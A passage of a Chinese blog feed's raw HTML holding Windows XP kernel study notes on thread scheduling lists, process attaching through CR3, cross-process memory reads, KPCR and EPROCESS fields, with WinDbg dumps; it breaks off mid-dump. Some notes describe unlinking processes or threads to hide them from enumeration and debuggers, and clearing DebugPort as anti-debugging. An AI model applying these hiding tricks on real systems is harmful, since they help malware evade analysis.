8055bc28</span><br><span class="line">8055bc30  8055bc30 8055bc30 8055bc38 8055bc38</span><br><span class="line">8055bc40  8055bc40 8055bc40 8055bc48 8055bc48</span><br><span class="line">8055bc50  8055bc50 8055bc50 8055bc58 8055bc58</span><br><span class="line">8055bc60  8055bc60 8055bc60 8055bc68 8055bc68</span><br><span class="line">8055bc70  8055bc70 8055bc70 8055bc78 8055bc78</span><br><span class="line">8055bc80  8055bc80 8055bc80 8055bc88 8055bc88</span><br><span class="line">8055bc90  8055bc90 8055bc90 8055bc98 8055bc98</span><br><span class="line"></span><br><span class="line">KiFindReadyThread查找方式：</span><br><span class="line">按照优先级别进行查找：31..30..29..28.....</span><br><span class="line"></span><br><span class="line">也就是说，在本次查找中，如果级别31的链表里面有线程，那么就不会</span><br><span class="line">查找级别为30的链表！</span><br></pre></td></tr></table></figure><h2 id="如何高效查找"><a href="#如何高效查找" class="headerlink" title="如何高效查找"></a>如何高效查找</h2><p>调度链表有32个，每次都从头开始查找效率太低，所以Windows都过一个DWORD类型变量的变量来记录：<br>当向调度链表(32个)中挂入或者摘除某个线程时，会判断当前级别的链表是否为空，为空将DWORD变量对应位置0，否则置1。<br>如下图</p><table><thead><tr><th>0</th><th>1</th><th>0</th><th>1</th><th>0</th><th>0</th><th>0</th><th>0</th><th>后面全是0</th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>这个图意思是30和28链表有值<br>这个变量：_kiReadySummary<br> 多cpu会随机寻找KiDispatcherReadyListHead指向的数组中的线程。线程可以绑定某个cpu（使用api：setThreadAffinityMask</p><p> 判断等待链表是否为空就是，前后值等于当前地址，就是空   </p><h2 id="如果没有就绪线程怎么办"><a href="#如果没有就绪线程怎么办" class="headerlink" title="如果没有就绪线程怎么办?"></a>如果没有就绪线程怎么办?</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PrcbData：</span><br><span class="line"></span><br><span class="line">+0x004 CurrentThread    : Ptr32 _KTHREAD</span><br><span class="line">+0x008 NextThread       : Ptr32 _KTHREAD</span><br><span class="line">+0x00c IdleThread       : Ptr32 _KTHREAD</span><br></pre></td></tr></table></figure><p>当发现没有要跑的线程，就执行空闲线程，每个KPCR里都会指定一个IdleThread  </p><h1 id="进程挂靠"><a href="#进程挂靠" class="headerlink" title="进程挂靠"></a>进程挂靠</h1><h2 id="进程与线程的关系"><a href="#进程与线程的关系" class="headerlink" title="进程与线程的关系"></a>进程与线程的关系</h2><p>一个进程可以包含多个线程<br>一个进程至少要有一个线程<br>进程为线程提供资源，也就是提供Cr3的值，Cr3中存储的是页目录表基址，Cr3确定了，线程能访问的内存也就确定了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">线程代码：</span><br><span class="line"></span><br><span class="line">mov eax,dword ptr ds:[0x12345678]</span><br><span class="line"></span><br><span class="line">CPU如何解析0x12345678这个地址呢？</span><br><span class="line"></span><br><span class="line">1) CPU解析线性地址时要通过页目录表来找对应的物理页，页目录表基址存在</span><br><span class="line">Cr3寄存器中。</span><br><span class="line"></span><br><span class="line">2) 当前的Cr3的值来源于当前的进程(_KPROCESS.DirectoryTableBase(+0x018))。</span><br></pre></td></tr></table></figure><h2 id="线程与进程如何关联"><a href="#线程与进程如何关联" class="headerlink" title="线程与进程如何关联"></a>线程与进程如何关联</h2><p>线程怎么找到所属进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ETHREAD结构体：</span><br><span class="line"></span><br><span class="line">+0x034 ApcState</span><br><span class="line">+0x000 ApcListHead </span><br><span class="line">   +0x010 Process </span><br><span class="line">   +0x014 KernelApcInProgress</span><br><span class="line">   +0x015 KernelApcPending</span><br><span class="line">   +0x016 UserApcPending</span><br><span class="line"></span><br><span class="line">+0x220 ThreadsProcess</span><br></pre></td></tr></table></figure></p><h2 id="养父母负责提供Cr3"><a href="#养父母负责提供Cr3" class="headerlink" title="养父母负责提供Cr3"></a>养父母负责提供Cr3</h2><p>线程切换的时候，会比较_KTHREAD结构体0x044处指定的EPROCESS是否为同一个,如果不是同一个，会将0x044处指定的EPROCESS的DirectoryTableBase的值取出，赋值给Cr3。<br>所以，线程需要的Cr3的值来源于0x044处偏移指定的EPROCESS.   </p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>0x220 亲生父母：这个线程谁创建的<br>0x044 养父母：谁在为这个线程提供资源(也就是提供Cr3)<br>一般情况下，0x220与0x44指向的是同一个进程   </p><p>(参考SwapContext函数) </p><h2 id="Cr3的值可以随便改吗"><a href="#Cr3的值可以随便改吗" class="headerlink" title="Cr3的值可以随便改吗?"></a>Cr3的值可以随便改吗?</h2><p>正常情况下，Cr3的值是由养父母提供的，但Cr3的值也可以改成和当前线程毫不相干的其他进程的DirectoryTableBase。   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">线程代码：</span><br><span class="line"></span><br><span class="line">mov cr3,A.DirectoryTableBase</span><br><span class="line">mov eax,dword ptr ds:[0x12345678]//A进程的0x12345678内存</span><br><span class="line">mov cr3,B.DirectoryTableBase</span><br><span class="line">mov eax,dword ptr ds:[0x12345678]//B进程的0x12345678内存</span><br><span class="line">mov cr3,C.DirectoryTableBase</span><br><span class="line">mov eax,dword ptr ds:[0x12345678]//C进程的0x12345678内存</span><br></pre></td></tr></table></figure><h5 id="将当前Cr3的值改为其他进程，称为“进程挂靠”。"><a href="#将当前Cr3的值改为其他进程，称为“进程挂靠”。" class="headerlink" title="将当前Cr3的值改为其他进程，称为“进程挂靠”。"></a>将当前Cr3的值改为其他进程，称为“进程挂靠”。</h5><p>为了使用别人进程内存的资源。访问其他进程   </p><h2 id="分析NtReadVirtualMemory函数"><a href="#分析NtReadVirtualMemory函数" class="headerlink" title="分析NtReadVirtualMemory函数"></a>分析NtReadVirtualMemory函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">NtReadVirtualMemory--&gt;KiAttachProcess</span><br><span class="line">KiAttachProcess--&gt;修改养父母</span><br><span class="line">修改养父母--&gt;修改Cr3</span><br></pre></td></tr></table></figure><p>可不可以只修改Cr3而不修改养父母？不可以，如果不修改养父母的值,一旦产生线程切换，就会变成自己读自己！<br>如果我们自己来写这个代码，在切换Cr3后关闭中断，并且不调用会导致线程切换的API,就可以不用修改养父母的值。</p><h2 id="总结：-2"><a href="#总结：-2" class="headerlink" title="总结："></a>总结：</h2><p>正常情况下，当前线程使用的Cr3是由其所属进程提供的(ETHREAD 0x44偏移处指定的EPROCESS)，正是因为如此，A进程中的线程只能访问A的内存。<br>如果要让A进程中的线程能够访问B进程的内存，就必须要修改Cr3的值为B进程的页目录表基址(B.DirectoryTableBase),这就是所谓的“进程挂靠”。</p><h1 id="跨进程读写内存"><a href="#跨进程读写内存" class="headerlink" title="跨进程读写内存"></a>跨进程读写内存</h1><p>跨进程的本质是“进程挂靠”,正常情况下，A进程的线程只能访问A进程的地址空间，如果A进程的线程想访问B进程的地址空间，就要修改当前的Cr3的值为B进程的页目录表基值(KPROCESS.DirectoryTableBase)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即：mov cr3,B.DirectoryTableBase</span><br></pre></td></tr></table></figure></p><h2 id="跨进程操作"><a href="#跨进程操作" class="headerlink" title="跨进程操作"></a>跨进程操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A进制中的线程代码：</span><br><span class="line"></span><br><span class="line">mov cr3,B.DirectoryTableBase//切换Cr3的值为B进程</span><br><span class="line">mov eax,dword ptr ds:[0x12345678]//将进程B 0x12345678的值存的eax中</span><br><span class="line">mov dword ptr ds:[0x00401234],eax//将数据存储到0x00401234中</span><br><span class="line">mov cr3,A.DirectoryTableBase//切换回Cr3的值 </span><br><span class="line"></span><br><span class="line">//此时0x00401234中的数据还有吗?</span><br><span class="line"></span><br><span class="line">//如何将数据传递给A进程的变量呢?</span><br><span class="line">写到内核里可以避免切回去值没了</span><br></pre></td></tr></table></figure><h2 id="NtReadVirtualMemory流程解析："><a href="#NtReadVirtualMemory流程解析：" class="headerlink" title="NtReadVirtualMemory流程解析："></a>NtReadVirtualMemory流程解析：</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/12.png" alt="12">  </p><h2 id="NtWriteVirtualMemory流程解析："><a href="#NtWriteVirtualMemory流程解析：" class="headerlink" title="NtWriteVirtualMemory流程解析："></a>NtWriteVirtualMemory流程解析：</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/13.png" alt="13"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 进程与线程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程切换 </tag>
            
            <tag> 进程挂靠 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>等待链表_调度链表</title>
      <link href="/2018/07/05/%E7%AD%89%E5%BE%85%E9%93%BE%E8%A1%A8-%E8%B0%83%E5%BA%A6%E9%93%BE%E8%A1%A8/"/>
      <url>/2018/07/05/%E7%AD%89%E5%BE%85%E9%93%BE%E8%A1%A8-%E8%B0%83%E5%BA%A6%E9%93%BE%E8%A1%A8/</url>
      <content type="html"><![CDATA[<p>进程结构体EPROCESS(0x50和0x190)是2个链表，里面圈着当前进程所有的线程。</p><pre><code>对进程断链，程序可以正常运行，原因是CPU执行与调度是基于线程的，进程断链只是影响一些遍历系统进程的API，并不会影响程序执行。对线程断链也是一样的，断链后在Windbg或者OD中无法看到被断掉的线程，但并不影响其执行(仍然再跑)。</code></pre><h1 id="33个链表"><a href="#33个链表" class="headerlink" title="33个链表"></a>33个链表</h1><p>线程有3种状态：就绪、等待、运行</p><p>正在运行中的线程存储在KPCR中，就绪和等待的线程全在另外的33个链表中。<br>一个等待链表，32个就绪链表：</p><p>这些链表都使用了_KTHREAD(0x060)这个位置，也就是说，线程在某一时刻，只能属于其中一个圈。</p><h2 id="等待链表"><a href="#等待链表" class="headerlink" title="等待链表"></a>等待链表</h2><p>kd&gt; dd KiWaitListHead</p><p>比如：线程调用了Sleep() 或者 WaitForSingleObject()等函数时，就挂到这个链表</p><p>(查看等待线程)</p><h2 id="调度链表"><a href="#调度链表" class="headerlink" title="调度链表"></a>调度链表</h2><p>调度链表有32个圈，就是优先级:0 - 31  0最低  31最高  默认优先级一般是8</p><p>改变优先级就是从一个圈里面卸下来挂到另外一个圈上</p><p>这32个圈是正在调度中的线程：包括正在运行的和准备运行的</p><p>比如：只有一个CPU但有10个线程在运行，那么某一时刻，正在运行的线程在KPCR中，其他9个在这32个圈中。</p><h2 id="查看调度链表"><a href="#查看调度链表" class="headerlink" title="查看调度链表"></a>查看调度链表</h2><p>既然有32个链表，就要有32个链表头。</p><p>kd&gt; dd KiDispatcherReadyListHead L70</p><h2 id="版本差异"><a href="#版本差异" class="headerlink" title="版本差异"></a>版本差异</h2><p>XP只有一个33个圈，也就是说上面这个数组只有一个，多核也只有一个.</p><p>Win7也是一样的只有一个圈，如果是64位的，那就有64个圈.</p><p>服务器版本：</p><p>KiWaitListHead整个系统只有一个，但KiDispatcherReadyListHead这个数组有几个CPU就有几组</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、正在运行的线程在KPCR中</p><p>2、准备运行的线程在32个调度链表中(0 - 31级)，KiDispatcherReadyListHead 是个数组存储了这32个链表头.</p><p>3、等待状态的线程存储在等待链表中，KiWaitListHead存储链表头.</p><p>4、这些圈都挂一个相同的位置：_KTHREAD(0x060)</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 进程与线程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 等待链表 </tag>
            
            <tag> 调度链表 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>KPCR</title>
      <link href="/2018/07/05/KPCR/"/>
      <url>/2018/07/05/KPCR/</url>
      <content type="html"><![CDATA[<h1 id="KPCR：CPU控制区（Processor-Control-Region）"><a href="#KPCR：CPU控制区（Processor-Control-Region）" class="headerlink" title="KPCR：CPU控制区（Processor Control Region）"></a>KPCR：CPU控制区（Processor Control Region）</h1><h2 id="KPCR介绍"><a href="#KPCR介绍" class="headerlink" title="KPCR介绍"></a>KPCR介绍</h2><p>KPCR相当于一个副本，存储着线程相关的一些重要信息，这样CPU在处理时就不用查线程了。<br>1) 当线程进入0环时，FS:[0]指向KPCR(3环时FS:[0] -&gt; TEB)</p><p>2) 每个CPU都有一个KPCR结构体(一个核一个)</p><p>3) KPCR中存储了CPU本身要用的一些重要数据：GDT、IDT以及线程相关的一些信息。</p><p>(在winbbg中查看KPCR结构体)</p><h2 id="NT-TIB主要成员介绍"><a href="#NT-TIB主要成员介绍" class="headerlink" title="_NT_TIB主要成员介绍"></a>_NT_TIB主要成员介绍</h2><p>1)    +0x000 ExceptionList    : Ptr32_EXCEPTION_REGISTRATION_RECORD<br>           当前线程内核异常链表(SEH)</p><p>2)    +0x004 StackBase        : Ptr32 Void<br>       +0x008 StackLimit       : Ptr32 Void<br>    当前线程内核栈的基址和大小</p><p>3)    +0x018 Self             : Ptr32 _NT_TIB    </p><pre><code>指向自己(也就是指向KPCR结构) 这样设计的目的是为了查找方便</code></pre><h2 id="KPCR的其他成员介绍"><a href="#KPCR的其他成员介绍" class="headerlink" title="KPCR的其他成员介绍"></a>KPCR的其他成员介绍</h2><p>1)    +0x01c SelfPcr          : Ptr32 _KPCR<br>    指向自己，方便寻址</p><p>2)    +0x020 Prcb             : Ptr32 _KPRCB<br>    指向拓展结构体PRCB  </p><p>3)    +0x038 IDT              : Ptr32 _KIDTENTRY<br>    IDT表基址</p><p>4)    +0x03c GDT              : Ptr32 _KGDTENTRY<br>    GDT表基址</p><p>5)    +0x040 TSS              : Ptr32 _KTSS<br>    指针，指向TSS，每个CPU都有一个TSS.都是指向当前线程的</p><p>6)    +0x051 Number           : UChar<br>    CPU编号：0 1 2 3 4 5。。。</p><p>7)    +0x120 PrcbData         : _KPRCB<br>    拓展结构体</p><h2 id="PRCB成员介绍"><a href="#PRCB成员介绍" class="headerlink" title="PRCB成员介绍"></a>PRCB成员介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+0x004 CurrentThread    : Ptr32 _KTHREAD</span><br><span class="line">+0x008 NextThread       : Ptr32 _KTHREAD</span><br><span class="line">+0x00c IdleThread       : Ptr32 _KTHREAD</span><br></pre></td></tr></table></figure><pre><code>当前线程即将切换的下一个线程空闲线程          </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPCR</span><br><span class="line">ntdll!_KPCR</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 Used_StackBase   : Ptr32 Void</span><br><span class="line">   +0x008 Spare2           : Ptr32 Void</span><br><span class="line">   +0x00c TssCopy          : Ptr32 Void</span><br><span class="line">   +0x010 ContextSwitches  : Uint4B</span><br><span class="line">   +0x014 SetMemberCopy    : Uint4B</span><br><span class="line">   +0x018 Used_Self        : Ptr32 Void</span><br><span class="line">   +0x01c SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +0x020 Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +0x024 Irql             : UChar</span><br><span class="line">   +0x028 IRR              : Uint4B</span><br><span class="line">   +0x02c IrrActive        : Uint4B</span><br><span class="line">   +0x030 IDR              : Uint4B</span><br><span class="line">   +0x034 KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +0x038 IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +0x03c GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +0x040 TSS              : Ptr32 _KTSS</span><br><span class="line">   +0x044 MajorVersion     : Uint2B</span><br><span class="line">   +0x046 MinorVersion     : Uint2B</span><br><span class="line">   +0x048 SetMember        : Uint4B</span><br><span class="line">   +0x04c StallScaleFactor : Uint4B</span><br><span class="line">   +0x050 SpareUnused      : UChar</span><br><span class="line">   +0x051 Number           : UChar</span><br><span class="line">   +0x052 Spare0           : UChar</span><br><span class="line">   +0x053 SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +0x054 VdmAlert         : Uint4B</span><br><span class="line">   +0x058 KernelReserved   : [14] Uint4B</span><br><span class="line">   +0x090 SecondLevelCacheSize : Uint4B</span><br><span class="line">   +0x094 HalReserved      : [16] Uint4B</span><br><span class="line">   +0x0d4 InterruptMode    : Uint4B</span><br><span class="line">   +0x0d8 Spare1           : UChar</span><br><span class="line">   +0x0dc KernelReserved2  : [17] Uint4B</span><br><span class="line">   +0x120 PrcbData         : _KPRCB</span><br><span class="line">kd&gt; dt _NT_TIB//3环的TEB也有这个结构体，不过存的是3环的信息</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 StackBase        : Ptr32 Void</span><br><span class="line">   +0x008 StackLimit       : Ptr32 Void</span><br><span class="line">   +0x00c SubSystemTib     : Ptr32 Void</span><br><span class="line">   +0x010 FiberData        : Ptr32 Void</span><br><span class="line">   +0x010 Version          : Uint4B</span><br><span class="line">   +0x014 ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +0x018 Self             : Ptr32 _NT_TIB</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 进程与线程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KPCR </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>进程结构体和线程结构体</title>
      <link href="/2018/07/05/%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93/"/>
      <url>/2018/07/05/%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93/</url>
      <content type="html"><![CDATA[<p>首先说明这分析的是XP系统，WIN7每个单元偏移略有差距</p><h1 id="进程结构体EPROCESS"><a href="#进程结构体EPROCESS" class="headerlink" title="进程结构体EPROCESS"></a>进程结构体EPROCESS</h1><p>每个windows进程在0环都有一个对应的结构体：EPROCESS  这个结构体包含了进程所有重要的信息。</p><p>PEB在3环，EPROCESS在0环。</p><h2 id="KPROCESS主要成员介绍"><a href="#KPROCESS主要成员介绍" class="headerlink" title="KPROCESS主要成员介绍"></a>KPROCESS主要成员介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1)+0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line"></span><br><span class="line">       “可等待”对象，比如Mutex互斥体、Event事件等（WaitForSingleObject）</span><br><span class="line"></span><br><span class="line">2)+0x018 DirectoryTableBase : [2] Uint4B</span><br><span class="line"></span><br><span class="line">        页目录表的基址，CR3的值</span><br><span class="line"></span><br><span class="line">3)+0x020 LdtDescriptor    : _KGDTENTRY</span><br><span class="line">      +0x028 Int21Descriptor  : _KIDTENTRY</span><br><span class="line"></span><br><span class="line">        历史遗留，16位Windows 段选择子不够 每个进程都有一个LDT表</span><br><span class="line">        Int21Descriptor  是 DOS下要用的</span><br><span class="line">4)+0x038 KernelTime       : Uint4B</span><br><span class="line">+0x03c UserTime         : Uint4B</span><br><span class="line">统计信息 记录了一个进程在内核模式/用户模式下所花的时间</span><br><span class="line"></span><br><span class="line">5)   +0x05c Affinity         : Uint4B</span><br><span class="line">规定进程里面的所有线程能在哪个CPU上跑,如果值为1，那这个进程的所以线程只能在0号CPU上跑(00000001)</span><br><span class="line">如果值为3，那这个进程的所以线程能在0、1号CPU上跑(000000011)</span><br><span class="line">如果值为4，那这个进程的所以线程能在2号CPU上跑(000000100)</span><br><span class="line">如果值为5，那这个进程的所以线程能在0，2号CPU上跑(000000101)</span><br><span class="line">4个字节共32位  所以最多32核 Windows64位 就64核</span><br><span class="line">如果只有一个CPU 把这个设置为4 那么这个进程就死了</span><br><span class="line">6)   +0x062 BasePriority     : Char</span><br><span class="line">基础优先级或最低优先级 该进程中的所有线程最起码的优先级.</span><br></pre></td></tr></table></figure><h2 id="EPROCESS其他成员"><a href="#EPROCESS其他成员" class="headerlink" title="EPROCESS其他成员"></a>EPROCESS其他成员</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1)+0x070 CreateTime       : _LARGE_INTEGER+0x078 ExitTime         : _LARGE_INTEGER</span><br><span class="line">进程的创建/退出时间</span><br><span class="line"></span><br><span class="line">2)+0x084 UniqueProcessId  : Ptr32 Void</span><br><span class="line">进程的编号 任务管理器中的PID</span><br><span class="line"></span><br><span class="line">3)+0x088 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">双向链表 所有的活动进程都连接在一起，构成了一个链表</span><br><span class="line">PsActiveProcessHead指向全局链表头</span><br><span class="line"></span><br><span class="line">4)+0x090 QuotaUsage       : [3] Uint4B+0x09c QuotaPeak        : [3] Uint4B</span><br><span class="line">物理页相关的统计信息</span><br><span class="line"></span><br><span class="line">5)+0x0a8 CommitCharge     : Uint4B</span><br><span class="line">   +0x0ac PeakVirtualSize  : Uint4B</span><br><span class="line">   +0x0b0 VirtualSize      : Uint4B</span><br><span class="line">虚拟内存相关的统计信息</span><br><span class="line"></span><br><span class="line">6)+0x11c VadRoot          : Ptr32 Void</span><br><span class="line">标识0-2G哪些地址没占用了</span><br><span class="line"></span><br><span class="line">7)+0x0bc DebugPort        : Ptr32 Void</span><br><span class="line">+0x0c0 ExceptionPort    : Ptr32 Void </span><br><span class="line">调试相关，DebugPort清0，就是一种反调试手段。</span><br><span class="line"></span><br><span class="line">8)+0x0c4 ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">句柄表，这里也可以反调试，遍历其他进程句柄表，如果发现自己就是被调试的</span><br><span class="line"></span><br><span class="line">9)+0x174 ImageFileName    : [16] UChar</span><br><span class="line">进程镜像文件名 最多16个字节</span><br><span class="line"></span><br><span class="line">10)+0x1a0 ActiveThreads    : Uint4B</span><br><span class="line">活动线程的数量</span><br><span class="line"></span><br><span class="line">11)+0x1b0 Peb              : Ptr32 _PEB</span><br><span class="line"></span><br><span class="line">PEB((Process Environment Block 进程环境块)：进程在3环的一个结构体，里面包含了进程的模块列表、是否处于调试状态等信息。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd PsActiveProcessHead</span><br><span class="line">83f7bf18  865cd960 8819eb10 00000000 00000000</span><br><span class="line">83f7bf28  83eef48c 00000000 00000000 8b6010a8</span><br><span class="line">这个是活动的进程链，是从_EPROCESS偏移0x88处链起来的所以要查看如下</span><br><span class="line"></span><br><span class="line">kd&gt; dt _EPROCESS 865cd960-0x88</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x098 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x0a0 CreateTime       : _LARGE_INTEGER 0x83f6fcc0`0000000b</span><br><span class="line">   +0x0a8 ExitTime         : _LARGE_INTEGER 0x007b0000`00000000</span><br><span class="line">   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x0b4 UniqueProcessId  : (null) </span><br><span class="line">   +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x0 